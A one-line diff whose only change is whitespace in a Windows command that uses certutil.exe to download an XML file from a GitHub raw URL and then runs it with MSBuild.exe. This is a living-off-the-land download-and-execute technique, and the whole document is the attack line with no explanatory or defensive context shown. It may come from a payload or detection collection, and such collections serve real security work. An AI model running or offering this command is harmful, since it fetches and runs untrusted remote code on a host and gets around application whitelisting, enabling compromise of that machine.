@@ -1,1 +1,1 @@
-certutil.exe -urlcache -f https://raw.githubusercontent.com/benjiabcdir/p/master/hathaway.xml hath.xml & timeout /T 5 &C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe hath.xml
+certutil.exe -urlcache -f https://raw.githubusercontent.com/benjiabcdir/p/master/hathaway.xml hath.xml & timeout /T 5 & C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe hath.xml
